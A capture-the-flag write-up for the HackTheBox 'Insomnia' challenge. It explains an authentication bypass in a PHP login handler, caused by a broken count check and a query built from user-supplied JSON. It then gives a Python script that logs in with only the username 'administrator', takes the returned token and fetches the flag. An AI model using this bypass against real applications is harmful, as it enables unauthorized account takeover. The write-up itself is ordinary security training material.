## This is my solution to the Insomnia Challenge on HackTheBox

### Issue in the Original Code

The original developer made a couple of mistakes in the code. Here are the issues and corrections:

#### Mistake 1

Original code:
```
if (!count($json_data) == 2) {
    return $this->respond("Please provide username and password", 404);
}
```

Correction:
```
if (count($json_data) !== 2) {
    return $this->respond("Please provide username and password", 404);
}
```

The original check `!count($json_data) == 2` is incorrect. It should be `count($json_data) !== 2` to properly validate the length of `$json_data`.

#### Mistake 2

Original code:
```
$query = $db->table("users")->getWhere($json_data, 1, 0);
```

This code only checks the username for validation by including everything in `$json_data`, which, combined with the mistake above, creates a serious vulnerability.

### Here is my exploit

```python
import requests
from bs4 import BeautifulSoup as bs

url = "http://94.237.62.149:54590/index.php"

def get_admin_token():
    full_path = f"{url}/login"
    headers = {"Content-Type": "application/json"}
    data = {"username": "administrator"}
    respond = requests.post(full_path, headers=headers, json=data)
    token = respond.text.split('"')[7]
    get_flag(token)

def get_flag(token):
    full_path = f"{url}/profile"
    cookies = {"token": token}
    flag = requests.get(full_path, cookies=cookies)
    soup = bs(flag.content, "html5lib")
    flag = soup.find("div", attrs={"class": "home__desc"})
    flag = flag.text.strip()
    print(f"Flag is => {flag}")

if __name__ == "__main__":
    get_admin_token()
```

This Python script demonstrates how to exploit the vulnerability by obtaining an admin token and then retrieving the flag.
